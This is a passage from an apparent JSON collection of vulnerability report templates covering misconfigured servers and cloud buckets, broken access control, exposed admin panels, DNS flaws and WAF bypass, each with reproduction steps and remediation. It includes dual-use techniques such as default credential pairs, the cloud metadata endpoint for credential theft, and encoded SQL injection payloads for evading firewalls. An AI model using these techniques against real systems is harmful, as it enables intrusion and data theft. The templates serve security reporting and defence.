                    "   c. **[What should happen]**: Directory listing should be disabled.",
                    "4. **[Scenario C: Publicly Accessible Configuration/Backup Files]**",
                    "   a. Look for common backup files (e.g., `.bak`, `.old`, `~`, `.zip`) or configuration files (e.g., `web.config`, `.env`, `config.php`, `database.yml`) in web-accessible directories.",
                    "   b. **[What happened]**: A sensitive file (e.g., `web.config.bak` containing database credentials) is found and downloaded.",
                    "   c. **[What should happen]**: Sensitive files should not be publicly accessible.",
                    "5. **[Scenario D: Version Information in Headers/Banners]**",
                    "   a. Inspect HTTP response headers (e.g., `Server`, `X-Powered-By`, `X-AspNet-Version`).",
                    "   b. Look for software banners or version strings in public-facing services (e.g., FTP, SSH, database connections if exposed).",
                    "   c. **[What happened]**: The `Server` header reveals `Apache/2.4.41 (Ubuntu)`, which has known vulnerabilities for older versions.",
                    "   d. **[What should happen]**: Server banners and version information should be suppressed or generalized.",
                    "6. **[Scenario E: Comments in Source Code]**",
                    "   a. View the page source (HTML, CSS, JavaScript) for comments (``, `/* */`).",
                    "   b. **[What happened]**: Comments contain developer notes, internal API endpoints, or TODOs that reveal sensitive logic or paths."
                  ],
                  "proof_of_concept": {
                    "response_header_example": "HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nX-Powered-By: PHP/7.4.3\n\n",
                    "notes": "Provide the exact URL where the information was disclosed. Show a screenshot or the content of the disclosed information (e.g., error message, directory listing, file content, HTTP headers). Clearly explain what specific piece of information was leaked and why it is sensitive."
                  },
                  "impact": "Aids attackers in conducting further, more targeted attacks by revealing critical details about the application's technology stack, architecture, internal naming conventions, database schema, and potential entry points. Increases the attack surface and reduces the effort required for exploitation.",
                  "remediation_suggestion": "Disable verbose error messages and stack traces in production environments. Configure web servers to suppress server banners and specific version information (e.g., `ServerTokens Prod` for Apache). Disable directory listing for all web-accessible directories. Remove or restrict access to all backup, temporary, and configuration files. Review source code for sensitive comments. Implement a robust logging and monitoring system to capture errors internally without exposing them publicly."
                },
                {
                  "vulnerability_name": "Misconfigured Web Server",
                  "summary": "Misconfigured Web Server vulnerabilities arise from insecure default settings or improper configuration of web server software (e.g., Apache, Nginx, IIS). This can lead to information disclosure, directory listing, access to sensitive files, or insecure handling of requests.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., webserver.example.com]",
                  "url_location": "[Any URL served by the web server, e.g., https://webserver.example.com/]",
                  "steps_to_reproduce": [
                    "1. Systematically probe the web server's behavior and inspect its configuration by accessing various paths.",
                    "2. **[Scenario A: Directory Listing Enabled]**",
                    "   a. Navigate to a directory without an `index.html` or `index.php` file (e.g., `https://webserver.example.com/uploads/`).",
                    "   b. **[What happened]**: The web server lists the contents of the directory, showing all files and subdirectories.",
                    "   c. **[What should happen]**: Directory listing should be disabled.",
                    "3. **[Scenario B: Default or Sample Files Exposed]**",
                    "   a. Look for common default or sample files left after installation (e.g., `/test.php`, `/info.php`, `/phpmyadmin/`, `/backup.zip`, `/install.txt`).",
                    "   b. **[What happened]**: A default installation file (e.g., `phpinfo.php`) is accessible, disclosing sensitive server configuration details.",
                    "   c. **[What should happen]**: Default and sample files should be removed from production servers.",
                    "4. **[Scenario C: Web Server Banners/Versions Exposed]**",
                    "   a. Inspect HTTP response headers (e.g., `Server`, `X-Powered-By`).",
                    "   b. **[What happened]**: The server banner reveals the exact version of Apache or Nginx, which might have known vulnerabilities.",
                    "   c. **[What should happen]**: Server banners should be suppressed or generic.",
                    "5. **[Scenario D: Overly Permissive File Permissions]**",
                    "   a. Attempt to access or write to files/directories that should not be publicly accessible or writable (e.g., configuration files, log directories).",
                    "   b. **[What happened]**: The web server allows reading of sensitive configuration files or writing to unintended directories.",
                    "   c. **[What should happen]**: File permissions should follow the principle of least privilege.",
                    "6. **[Scenario E: Weak TLS Configuration]**",
                    "   a. Use an SSL/TLS scanner (e.g., SSL Labs Server Test) to assess the server's TLS configuration.",
                    "   b. **[What happened]**: The server supports weak ciphers, outdated TLS versions (e.g., TLS 1.0/1.1), or known vulnerable algorithms.",
                    "   c. **[What should happen]**: Only strong ciphers and modern TLS versions (TLS 1.2, 1.3) should be supported."
                  ],
                  "proof_of_concept": {
                    "url_example": "https://webserver.example.com/uploads/",
                    "notes": "Provide the exact URL demonstrating the misconfiguration. Show a screenshot of the directory listing, the content of an exposed sensitive file, or the HTTP headers revealing verbose information. Explain the specific misconfiguration (e.g., 'Directory listing enabled on the `/uploads` directory')."
                  },
                  "impact": "Information disclosure (e.g., source code, configuration files, directory contents). Compromise of sensitive data. Enables further attacks by providing reconnaissance (e.g., vulnerable software versions). Can lead to denial of service or remote code execution depending on the specific flaw.",
                  "remediation_suggestion": "Disable directory listing for all public-facing directories. Remove all default, sample, and unnecessary files from production servers. Suppress or generalize server banners and version information in HTTP headers. Implement the principle of least privilege for file and directory permissions. Ensure secure TLS configuration (disable weak ciphers, outdated protocols). Regularly update and patch web server software to the latest stable versions."
                },
                {
                  "vulnerability_name": "Misconfigured Cloud Resources",
                  "summary": "Misconfigured Cloud Resources involve security weaknesses stemming from incorrect setup of cloud services (e.g., AWS S3, Azure Blob Storage, Google Cloud Storage, EC2/VM instances, IAM roles, security groups). These misconfigurations can lead to unauthorized data access, sensitive data exposure, privilege escalation, or even remote code execution.",
                  "severity": "High",
                  "target": "[Specify affected cloud account/resource, e.g., AWS S3 Bucket, Azure VM]",
                  "url_location": "[Specific URL of the misconfigured resource, e.g., https://my-company-data.s3.amazonaws.com/]",
                  "steps_to_reproduce": [
                    "1. Identify cloud services used by the target organization.",
                    "2. **[Scenario A: Publicly Accessible Storage Buckets (e.g., S3, GCS, Azure Blob)]**",
                    "   a. Attempt to list or download files from known/guessed bucket names (e.g., `s3.amazonaws.com/company-backup`, `company-images.blob.core.windows.net`).",
                    "   b. **[What happened]**: The bucket is publicly readable/writable, exposing sensitive data or allowing arbitrary file uploads.",
                    "   c. **[What should happen]**: Buckets should be private by default and access restricted to authorized users/roles.",
                    "3. **[Scenario B: Overly Permissive IAM Policies/Roles]**",
                    "   a. If an application's cloud credentials or temporary credentials (e.g., from EC2 instance metadata) are exposed, attempt to use them to list/modify other cloud resources.",
                    "   b. **[What happened]**: The IAM role attached to a low-privilege service allows administrative actions on other services.",
                    "   c. **[What should happen]**: IAM policies should follow the principle of least privilege.",
                    "4. **[Scenario C: Exposed EC2/VM Instance Metadata]**",
                    "   a. Attempt to access the instance metadata endpoint from a web application hosted on an EC2/VM instance (e.g., `http://169.254.169.254/latest/meta-data/`).",
                    "   b. **[What happened]**: The application's SSRF vulnerability allows access to instance metadata, leaking IAM role credentials.",
                    "   c. **[What should happen]**: SSRF protections should block access to metadata endpoints.",
                    "5. **[Scenario D: Misconfigured Security Groups/Network ACLs]**",
                    "   a. Scan exposed cloud instances for open ports (e.g., SSH (22), RDP (3389), database ports (3306, 5432)) that should not be publicly accessible.",
                    "   b. **[What happened]**: A database server is publicly exposed, allowing direct connection attempts.",
                    "   c. **[What should happen]**: Only necessary ports should be open to the internet, and restricted to specific IPs if possible.",
                    "6. **[Scenario E: Unused/Dangling DNS Records (leading to Domain Takeover)]**",
                    "   a. (Covered separately, but a common cloud misconfiguration) DNS records pointing to unprovisioned cloud resources."
                  ],
                  "proof_of_concept": {
                    "resource_url_example": "https://company-sensitive-data.s3.amazonaws.com/",
                    "notes": "Provide the exact URL/ARN of the misconfigured cloud resource. Describe the type of misconfiguration (e.g., 'S3 bucket publicly readable'). Show a screenshot of sensitive data accessed from the public bucket, or evidence of unauthorized actions performed with leaked credentials. If it's a security group issue, show scan results indicating open ports that should be closed."
                  },
                  "impact": "Sensitive data breaches (PII, intellectual property, credentials). Unauthorized access to internal systems and resources. Privilege escalation within the cloud environment. Denial of Service (DoS) by resource deletion. Remote Code Execution (RCE) if vulnerable services are exposed. Can lead to significant financial and reputational damage.",
                  "remediation_suggestion": "Implement the principle of least privilege for all cloud resources. Make storage buckets private by default and strictly control access via bucket policies or IAM roles. Regularly audit IAM policies to ensure no excessive permissions are granted. Implement SSRF protections to prevent access to instance metadata. Configure security groups and network ACLs to only expose necessary ports to the internet, preferably with IP restrictions. Use cloud security posture management (CSPM) tools to continuously monitor for misconfigurations."
                },
                {
                  "vulnerability_name": "Broken Access Control",
                  "summary": "Broken Access Control occurs when an application fails to properly enforce restrictions on what authenticated users can access or do. This allows users to bypass authorization checks and access functions or data they should not be allowed to, leading to privilege escalation, data leakage, or unauthorized actions.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., app.example.com]",
                  "url_location": "[Full URL of the vulnerable endpoint, e.g., https://app.example.com/admin/users/123]",
                  "steps_to_reproduce": [
                    "1. Authenticate to the application as a low-privileged user (e.g., a regular user, or user A).",
                    "2. **[Scenario A: Insecure Direct Object Reference (IDOR)]**",
                    "   a. Access a resource (e.g., user profile, document, order) and observe the parameter used to identify it (e.g., `user_id=123`, `doc_id=XYZ`).",
                    "   b. Change the parameter to a value belonging to another user (e.g., `user_id=124`, `doc_id=ABC`).",
                    "   c. **[What happened]**: The application displays the information or resource belonging to user 124/ABC, even though user 123/XYZ should not have access.",
                    "   d. **[What should happen]**: The application should verify if the authenticated user is authorized to access the requested resource.",
                    "3. **[Scenario B: Privilege Escalation (Vertical)]**",
                    "   a. As a low-privileged user, attempt to access administrative functions or pages (e.g., `https://app.example.com/admin`, `/manage_users`, `/dashboard/settings`).",
                    "   b. **[What happened]**: The application allows access to administrative interfaces without proper authorization checks.",
                    "   c. **[What should happen]**: Only users with appropriate roles should access administrative functions.",
                    "4. **[Scenario C: Privilege Escalation (Horizontal)]**",
                    "   a. Log in as User A. Observe functionality. Log in as User B. Observe functionality.",
                    "   b. As User A, attempt to perform an action on behalf of User B (e.g., change User B's password, view User B's private messages) by manipulating parameters or requests.",
                    "   c. **[What happened]**: User A successfully performs an action intended only for User B.",
                    "   d. **[What should happen]**: Actions should be restricted to the authenticated user's own resources.",
                    "5. **[Scenario D: API Access Control Bypass]**",
                    "   a. Try to access API endpoints directly (e.g., `/api/v1/users/`) or by changing HTTP methods (e.g., `GET` instead of `POST`, or `PUT` on a `GET`-only endpoint)."
                  ],
                  "proof_of_concept": {
                    "url_example": "https://app.example.com/api/v1/orders/ORD_001",
                    "request_example": "GET /api/v1/orders/ORD_002 HTTP/1.1\nHost: app.example.com\nCookie: session=low_privileged_user_cookie",
                    "notes": "Clearly state the user roles involved (e.g., 'Logged in as Standard User'). Provide the exact URL and/or HTTP request that demonstrates the access control bypass. Show a screenshot or the response content indicating successful access to unauthorized data or functionality (e.g., 'Successfully viewed User B's profile from User A's session')."
                  },
                  "impact": "Unauthorized access to sensitive data (e.g., other users' PII, confidential documents). Unauthorized modification or deletion of data. Privilege escalation (e.g., a regular user gaining admin rights). Bypassing security features. Can lead to complete compromise of the application and data breaches.",
                  "remediation_suggestion": "Implement robust server-side access control checks for every request to any resource or function. Always verify user authorization based on their session, role, and ownership of the requested resource. Never rely solely on client-side controls. For IDORs, ensure the resource ID belongs to the authenticated user. Implement proper authentication and session management. Adopt a 'deny by default' approach to access control. Test access control thoroughly across all user roles and functionalities."
                },
                {
                  "vulnerability_name": "Sensitive Data Exposure",
                  "summary": "Sensitive Data Exposure occurs when an application fails to properly protect sensitive data, both in transit and at rest. This can result from weak encryption, improper handling of credentials, insecure storage, or accidental disclosure, leading to data breaches and privacy violations.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., app.example.com]",
                  "url_location": "[Any URL where sensitive data is handled/stored, e.g., https://app.example.com/user_data]",
                  "steps_to_reproduce": [
                    "1. Identify sensitive data handled by the application (e.g., PII, financial info, credentials, health records).",
                    "2. **[Scenario A: Data in Transit (Weak/No Encryption)]**",
                    "   a. Access a sensitive page or submit sensitive data (e.g., login form, payment details) over HTTP (not HTTPS).",
                    "   b. **[What happened]**: The sensitive data is transmitted in cleartext over the network, making it vulnerable to sniffing.",
                    "   c. **[What should happen]**: All sensitive data should always be transmitted over HTTPS.",
                    "3. **[Scenario B: Insecure Storage of Passwords/Credentials]**",
                    "   a. If there's a vulnerability like SQL Injection or Local File Read, attempt to dump user credentials from the database or configuration files.",
                    "   b. **[What happened]**: Passwords are stored in plain text or using weak, reversible encryption (e.g., MD5 without salt).",
                    "   c. **[What should happen]**: Passwords should be stored using strong, one-way hashing algorithms (e.g., bcrypt, scrypt, Argon2) with proper salting.",
                    "4. **[Scenario C: Sensitive Data in Error Messages/Logs]**",
                    "   a. Trigger an error (e.g., malformed input, non-existent page).",
                    "   b. **[What happened]**: The error message or a publicly accessible log file contains sensitive user data or internal system details (e.g., database connection strings, API keys).",
                    "   c. **[What should happen]**: Sensitive data should never be exposed in error messages or public logs.",
                    "5. **[Scenario D: Sensitive Data in URL Parameters]**",
                    "   a. Observe if sensitive data (e.g., session IDs, tokens, personal identifiers) is passed in URL query parameters when navigating.",
                    "   b. **[What happened]**: The sensitive data appears in the URL, making it vulnerable to leakage via referrer headers, browser history, or server logs.",
                    "   c. **[What should happen]**: Sensitive data should be passed via POST body or HTTP headers, not URL parameters.",
                    "6. **[Scenario E: Cache of Sensitive Data]**",
                    "   a. (Covered under Insecure Caching of Sensitive Data) If sensitive data is cached insecurely by the browser or proxy."
                  ],
                  "proof_of_concept": {
                    "traffic_capture_example": "GET /login?username=test&password=password123 HTTP/1.1",
                    "notes": "Clearly state the type of sensitive data exposed (e.g., 'plain text password'). Describe the method of exposure (e.g., 'via HTTP traffic', 'in error message'). Provide a screenshot of the cleartext data in network traffic (e.g., Wireshark) or the content of the exposed log/error message. For insecure storage, describe how the data was accessed and its format."
                  },
                  "impact": "Confidentiality breach leading to privacy violations, identity theft, financial fraud, and account compromise. Undermines user trust and can lead to significant regulatory fines and reputational damage.",
                  "remediation_suggestion": "Encrypt all sensitive data in transit using strong TLS (HTTPS) with HSTS. Store sensitive data at rest using strong encryption algorithms. Hash passwords using modern, strong, one-way adaptive hashing algorithms (e.g., bcrypt, scrypt, Argon2) with appropriate salts. Avoid storing sensitive data in URL parameters, client-side caches, or public logs. Implement strict access controls for all data storage. Regularly audit for accidental data exposure."
                },
                {
                  "vulnerability_name": "Exposed Admin Interfaces",
                  "summary": "Exposed Admin Interfaces are administrative panels or functionalities that are accessible to unauthorized individuals. This can be due to a lack of proper access controls, predictable URLs, default credentials, or exposure to the internet, potentially leading to full system compromise.",
                  "severity": "Critical",
                  "target": "[Specify affected asset, e.g., app.example.com]",
                  "url_location": "[Full URL of the admin interface, e.g., https://app.example.com/admin/]",
                  "steps_to_reproduce": [
                    "1. Identify common administrative interface URLs (e.g., `/admin`, `/dashboard`, `/cpanel`, `/phpmyadmin`, `/wp-admin`, `/manager`, `/login.jsp`).",
                    "2. **[Scenario A: Direct Access without Authentication]**",
                    "   a. Attempt to navigate directly to the identified admin URLs without logging in or using a low-privileged account.",
                    "   b. **[What happened]**: The admin interface is directly accessible, or certain functionalities are available, without requiring authentication.",
                    "   c. **[What should happen]**: All admin interfaces should require strong authentication.",
                    "3. **[Scenario B: Weak/Default Credentials]**",
                    "   a. Attempt to log in to the admin interface using common default credentials (e.g., `admin/admin`, `root/toor`, `test/test`, blank passwords).",
                    "   b. **[What happened]**: Default credentials grant access to the admin interface.",
                    "   c. **[What should happen]**: Default credentials should be changed immediately, and strong password policies enforced.",
                    "4. **[Scenario C: Predictable URLs / Lack of Obscurity]**",
                    "   a. If the admin panel URL is easily guessable or is indexed by search engines.",
                    "   b. **[What happened]**: The admin interface is easily discoverable by attackers.",
                    "   c. **[What should happen]**: Admin interfaces should not rely on obscurity and should be protected by strong access controls.",
                    "5. **[Scenario D: IP Restriction Bypass]**",
                    "   a. If the admin interface is supposedly IP-restricted, attempt to bypass it via proxy, `X-Forwarded-For` header manipulation, or DNS rebinding.",
                    "   b. **[What happened]**: The IP restriction is bypassed, allowing access from unauthorized locations.",
                    "   c. **[What should happen]**: IP restrictions should be robustly implemented at the network or web server level.",
                    "6. Once access is gained, note the functionalities available (e.g., user management, system configuration, file upload, command execution)."
                  ],
                  "proof_of_concept": {
                    "url_example": "https://app.example.com/admin/",
                    "notes": "Provide the exact URL of the exposed admin interface. If access was gained, provide a screenshot of the admin panel demonstrating unauthorized access or an action performed (e.g., a user created, a setting changed). Clearly state the method of access (e.g., 'Direct access without authentication', 'Used default credentials: admin/admin')."
                  },
                  "impact": "Complete compromise of the application and potentially the underlying server. Unauthorized access to all data, including sensitive user information. Ability to modify application behavior, create/delete users, inject malicious code, or even achieve Remote Code Execution (RCE). This is a critical vulnerability.",
                  "remediation_suggestion": "Implement strong authentication for all administrative interfaces. Enforce multi-factor authentication (MFA) for admin accounts. Change all default credentials immediately upon installation. Restrict access to admin interfaces via network-level controls (e.g., firewall rules, VPN, IP whitelisting). Ensure admin interfaces are not indexed by search engines (e.g., via `robots.txt`). Log all access attempts and administrative actions for auditing purposes. Do not rely on obscurity for security."
                },
                {
                  "vulnerability_name": "Unprotected S3/GCS Buckets",
                  "summary": "Unprotected S3/GCS Buckets (or other cloud storage) refer to storage buckets configured with overly permissive access policies, allowing unauthorized users to publicly list, read, or write content. This leads to massive sensitive data exposure, data leakage, defacement, or even malware hosting.",
                  "severity": "Critical",
                  "target": "[Specify affected cloud storage, e.g., AWS S3, Google Cloud Storage, Azure Blob]",
                  "url_location": "[Specific URL of the bucket, e.g., https://my-company-backup.s3.amazonaws.com/]",
                  "steps_to_reproduce": [
                    "1. Identify potential bucket names related to the target organization (e.g., `company-name-data`, `company-name-backup`, `company-name-public`).",
                    "2. Attempt to access these bucket URLs directly in a web browser or using tools like `aws s3 ls s3://bucket-name` (for AWS S3) or `gsutil ls gs://bucket-name` (for GCS) without authentication.",
                    "3. **[Scenario A: Public Read Access]**",
                    "   a. **[What happened]**: The bucket contents are publicly listable, and files within are readable, exposing sensitive documents, images, or configuration files.",
                    "   b. **[What should happen]**: Buckets should be private by default, and access strictly controlled.",
                    "4. **[Scenario B: Public Write Access]**",
                    "   a. Attempt to upload a file to the bucket using `aws s3 cp test.txt s3://bucket-name/test.txt` or a simple HTTP PUT request.",
                    "   b. **[What happened]**: The upload is successful, allowing an attacker to host malicious files, deface website assets, or store arbitrary data.",
                    "   c. **[What should happen]**: Write access should be highly restricted.",
                    "5. **[Scenario C: Misconfigured Bucket Policy/ACL]**",
                    "   a. Public read/write access is often due to explicitly configured bucket policies or ACLs that grant `Everyone` or `AllUsers` permissions.",
                    "   b. **[What happened]**: A policy like `\"Principal\": {\"AWS\": \"*\"}` or `\"Principal\": \"*\"` is present in the bucket policy.",
                    "   c. **[What should happen]**: Policies should use granular IAM principals.",
                    "6. Document the sensitive files found or the successful upload/modification."
                  ],
                  "proof_of_concept": {
                    "url_example": "https://company-secret-files.s3.amazonaws.com/",
                    "cli_command_example": "aws s3 ls s3://company-secret-files/",
                    "notes": "Provide the exact URL of the unprotected bucket. Show a screenshot of the publicly accessible bucket listing files, or the contents of a sensitive file accessed directly. If write access is demonstrated, show evidence of a file successfully uploaded by the attacker to the bucket. Highlight the type of sensitive data exposed."
                  },
                  "impact": "Massive sensitive data breaches (PII, intellectual property, financial data, internal documents, source code). Compliance violations (e.g., GDPR, HIPAA). Data tampering or deletion. Website defacement if serving static assets. Malware hosting and phishing. Can lead to severe financial penalties and reputational damage.",
                  "remediation_suggestion": "Block all public access to S3/GCS buckets unless explicitly required and verified. Set bucket policies to 'private' by default. Use granular IAM policies and roles to grant access only to authorized users or services. Regularly audit bucket policies and ACLs. Enable server-side encryption for data at rest. Implement logging and monitoring for bucket access. Utilize bucket access analysis tools provided by cloud providers."
                },
                {
                  "vulnerability_name": "Server Misconfigurations (e.g., Directory Listing)",
                  "summary": "Server Misconfigurations encompass a broad range of security flaws arising from insecure default settings or incorrect configuration of web servers, application servers, or other components. This can lead to information disclosure, unauthorized access, or weakening of security controls.",
                  "severity": "Medium",
                  "target": "[Specify affected server, e.g., webserver.example.com]",
                  "url_location": "[Any URL served by the misconfigured server, e.g., https://webserver.example.com/data/]",
                  "steps_to_reproduce": [
                    "1. Systematically probe the server's behavior and analyze its responses.",
                    "2. **[Scenario A: Directory Listing Enabled]**",
                    "   a. Navigate to directories that typically don't have an `index.html` or `index.php` (e.g., `/img/`, `/uploads/`, `/data/`, `/assets/`).",
                    "   b. **[What happened]**: The web server displays a list of all files and subdirectories within that directory, revealing file names, structures, and potentially sensitive temporary files or backups.",
                    "   c. **[What should happen]**: Directory listing should be disabled in production.",
                    "3. **[Scenario B: Default/Sample Files Exposed]**",
                    "   a. Attempt to access common default installation files or sample pages (e.g., `/phpinfo.php`, `/test.asp`, `/admin/readme.txt`, `/web.config.bak`, `/install.sql`).",
                    "   b. **[What happened]**: These files are accessible and expose sensitive configuration information, database credentials, or application architecture details.",
                    "   c. **[What should happen]**: All default and sample files should be removed from production servers.",
                    "4. **[Scenario C: Verbose Error Messages / Debugging Mode]**",
                    "   a. Force an error by providing invalid input, accessing non-existent resources, or causing an application crash.",
                    "   b. **[What happened]**: The server responds with detailed stack traces, database errors, or specific technology version information (e.g., PHP warnings, ASP.NET yellow screen of death).",
                    "   c. **[What should happen]**: Error messages should be generic in production environments.",
                    "5. **[Scenario D: Exposed Server Banners / Version Info]**",
                    "   a. Inspect HTTP response headers (`Server`, `X-Powered-By`, `X-AspNet-Version`) or public-facing service banners (e.g., FTP, SSH).",
                    "   b. **[What happened]**: Exact software versions are revealed (e.g., `Nginx/1.18.0`, `OpenSSH 7.6p1`), making it easier for attackers to find specific exploits.",
                    "   c. **[What should happen]**: Version information should be suppressed or generalized.",
                    "6. **[Scenario E: Weak TLS/SSL Configuration]**",
                    "   a. Use an SSL/TLS scanner to test the server's cryptographic configuration.",
                    "   b. **[What happened]**: The server supports outdated TLS versions (TLS 1.0/1.1), weak ciphers (e.g., RC4, 3DES), or is vulnerable to known attacks (e.g., Heartbleed, POODLE).",
                    "   c. **[What should happen]**: Only strong, modern TLS versions and ciphers should be enabled."
                  ],
                  "proof_of_concept": {
                    "url_example": "https://webserver.example.com/uploads/",
                    "notes": "Provide the exact URL where the misconfiguration is evident. Show a screenshot of the directory listing, the contents of an exposed sensitive file, or the HTTP headers revealing verbose information. Clearly explain the specific server misconfiguration (e.g., 'Directory listing enabled on the `/uploads` directory')."
                  },
                  "impact": "Information disclosure (e.g., internal structure, sensitive files, technology stack versions). Enables further attacks by providing reconnaissance. Can lead to unauthorized access, remote code execution (if a specific version is vulnerable), or denial of service.",
                  "remediation_suggestion": "Disable directory listing for all web-accessible directories. Remove all default/sample files from production servers. Configure verbose error messages to be disabled in production. Suppress or generalize server banners and version information. Harden TLS/SSL configuration by disabling weak protocols and ciphers. Implement the principle of least privilege for file and directory permissions. Regularly update and patch all server software."
                },
                {
                  "vulnerability_name": "Misconfigured DNS / MX Records",
                  "summary": "Misconfigured DNS (Domain Name System) or MX (Mail Exchange) records can lead to various security issues, including email interception, phishing attacks, domain/subdomain takeover, and bypassing security controls.",
                  "severity": "Medium",
                  "target": "[Specify affected domain, e.g., example.com]",
                  "url_location": "[The affected domain itself, e.g., example.com]",
                  "steps_to_reproduce": [
                    "1. Use DNS lookup tools (`dig`, `nslookup`, `whois`, online DNS checkers) to query the target domain's DNS records (A, CNAME, NS, MX, TXT, SPF, DMARC, DKIM).",
                    "2. **[Scenario A: Dangling DNS Record (leading to Domain/Subdomain Takeover)]**",
                    "   a. (Covered separately, but a result of DNS misconfiguration) A CNAME record points to a decommissioned or unprovisioned cloud resource (e.g., S3 bucket, Heroku app).",
                    "   b. **[What happened]**: An attacker can claim the resource and take over the subdomain.",
                    "   c. **[What should happen]**: DNS records should be removed or updated when services are decommissioned.",
                    "3. **[Scenario B: Weak SPF/DMARC/DKIM Records (leading to Email Spoofing)]**",
                    "   a. Check the domain's SPF (Sender Policy Framework), DMARC (Domain-based Message Authentication, Reporting & Conformance), and DKIM (DomainKeys Identified Mail) TXT records.",
                    "   b. **[What happened]**: The SPF record is missing, too permissive (`include:attacker.com`), or softfail (`~all` instead of `-all`). DMARC/DKIM are missing or in monitoring mode.",
                    "   c. **[What should happen]**: SPF should be restrictive (`-all`). DMARC/DKIM should be configured for rejection (`p=reject`) to prevent email spoofing.",
                    "4. **[Scenario C: MX Record Pointing to Non-existent/Vulnerable Mail Server]**",
                    "   a. The MX record points to a mail server that is no longer active or is running an outdated, vulnerable version.",
                    "   b. **[What happened]**: Emails might be blackholed, or the vulnerable mail server could be exploited to intercept emails.",
                    "   c. **[What should happen]**: MX records should point to active, secure mail servers.",
                    "5. **[Scenario D: Wildcard DNS Records]**",
                    "   a. A wildcard DNS record (`*.example.com`) points to a single web server.",
                    "   b. **[What happened]**: If that web server is vulnerable (e.g., to Host Header Injection), it can affect all subdomains. Also, allows an attacker to create new subdomains on the target domain without control over DNS, which can be used for phishing.",
                    "   c. **[What should happen]**: Use wildcard records judiciously and ensure the receiving server is hardened."
                  ],
                  "proof_of_concept": {
                    "dns_query_example": "dig MX example.com",
                    "notes": "Provide the specific DNS query results (e.g., `dig` output) that demonstrate the misconfiguration. For SPF/DMARC, show the vulnerable TXT record. Explain how this misconfiguration can be exploited (e.g., 'Missing SPF record allows email spoofing, making phishing easier'). For subdomain takeover, refer to that specific vulnerability's PoC."
                  },
                  "impact": "Email spoofing and phishing attacks. Domain/subdomain takeover, leading to reputation damage, malware distribution, and bypassing security controls. Service disruption if critical records (e.g., A, MX) are misconfigured. Can expose internal network details or facilitate other attacks.",
                  "remediation_suggestion": "Regularly audit all DNS records. Remove dangling CNAMEs or other records pointing to unprovisioned resources. Implement strong SPF policies (`v=spf1 include:_spf.example.com -all`). Configure DMARC (`p=reject`) and DKIM for email authentication. Ensure MX records point to active and secure mail servers. Use wildcard DNS records with caution and only when necessary, ensuring robust security on the target server. Utilize DNS monitoring tools to detect unauthorized changes."
                },
                {
                  "vulnerability_name": "Proxy / WAF Protections Bypass",
                  "summary": "Proxy / WAF Protections Bypass occurs when an attacker finds a way to circumvent the security controls implemented by a Web Application Firewall (WAF) or a reverse proxy. This allows malicious requests to reach the backend application, enabling the exploitation of underlying vulnerabilities that the WAF/proxy was intended to block.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., app.example.com (protected by WAF)]",
                  "url_location": "[Any URL where WAF/proxy protection is active, e.g., https://app.example.com/api/products]",
                  "steps_to_reproduce": [
                    "1. Identify an application protected by a WAF or proxy (look for `X-WAF-Info`, `Server` headers, or observe typical WAF blocking responses).",
                    "2. **[Scenario A: Obfuscation Techniques (e.g., Encoding, Case Changes)]**",
                    "   a. Try to bypass SQL injection or XSS filters by encoding payloads (URL encoding, HTML encoding, Unicode, double encoding), changing casing, or using alternative syntax. Example: `SELECT 'a'` vs. `SeLeCt 'a'`, or `union` vs. `uni/**/on`.",
                    "   b. **[What happened]**: The WAF fails to detect the malicious payload, and the backend application processes it.",
                    "   c. **[What should happen]**: WAFs should be robust to various encoding and obfuscation techniques.",
                    "3. **[Scenario B: Parameter Pollution]**",
                    "   a. If the WAF inspects only the first instance of a parameter, send duplicate parameters. Example: `param=val1&param=val2`.",
                    "   b. **[What happened]**: The WAF sees `param=val1` (benign), but the backend processes `param=val2` (malicious).",
                    "   c. **[What should happen]**: WAFs should normalize and inspect all instances of parameters.",
                    "4. **[Scenario C: HTTP Request Smuggling / H2C Smuggling]**",
                    "   a. (As covered in previous entries) These techniques exploit inconsistencies in how proxies and backends interpret request boundaries, allowing payloads to bypass WAF inspection.",
                    "   b. **[What happened]**: The smuggled request reaches the backend, bypassing WAF rules.",
                    "5. **[Scenario D: Header Manipulation / Unkeyed Headers]**",
                    "   a. Inject payloads into less commonly inspected HTTP headers (e.g., `X-Originating-IP`, `X-Forwarded-For`, custom headers) or abuse hop-by-hop headers.",
                    "   b. **[What happened]**: The WAF doesn't inspect the injected header, and the backend processes it.",
                    "   c. **[What should happen]**: WAFs should inspect all relevant headers, and the backend should validate them.",
                    "6. **[Scenario E: Path Traversal / Normalization Issues]**",
                    "   a. Use different path representations (e.g., `//`, `../`, `%2f`, `%2e%2e%2f`) to reach a blocked path or file (e.g., `/admin/users` vs. `/%2e%2e/admin/users`).",
                    "   b. **[What happened]**: The WAF normalizes the path differently than the backend, or fails to detect the malicious path.",
                    "   c. **[What should happen]**: WAFs should perform robust path normalization consistent with the backend.",
                    "7. Demonstrate that the underlying vulnerability (e.g., SQLi, XSS) is now exploitable after the bypass."
                  ],
                  "proof_of_concept": {
                    "request_example": "GET /api/data?id=1%2527%20OR%201%3D1-- HTTP/1.1\nHost: app.example.com",
                    "notes": "Provide the exact HTTP request that successfully bypasses the WAF/proxy and triggers the underlying vulnerability. Show the response from the server that indicates the bypass was successful (e.g., SQL injection error, XSS alert box). Clearly explain the specific technique used to bypass the WAF (e.g., 'Double URL encoding bypassed the WAF's SQLi filter')."
                  },
                  "impact": "Neutralizes the protection offered by the WAF/proxy, exposing the underlying application to the full impact of vulnerabilities like SQL Injection, XSS, RCE, and access control bypasses. Increases the risk of data breaches, system compromise, and denial of service.",
                  "remediation_suggestion": "Implement a layered security approach; do not rely solely on a WAF. Ensure the WAF and backend normalize requests consistently. Regularly update WAF rules and definitions. Combine WAFs with input validation and output encoding at the application layer. Consider positive security models for WAFs (allowlisting). Monitor WAF logs for bypass attempts and tune rules accordingly. Conduct regular penetration tests to identify bypass techniques."
                },
                  {
  "vulnerability_name": "Uncovering Cloudflare",
  "summary": "Uncovering Cloudflare involves techniques to identify if a website is using Cloudflare and, more importantly, to discover its original (origin) IP address, bypassing Cloudflare's protective layer. This allows attackers to directly target the origin server, circumventing Cloudflare's WAF, DDoS protection, and other security features.",
  "severity": "Medium",
  "target": "[Specify affected domain, e.g., example.com]",
  "url_location": "[The protected domain, e.g., https://example.com/]",
  "steps_to_reproduce": [
    "1. **Check for Cloudflare Presence:**",
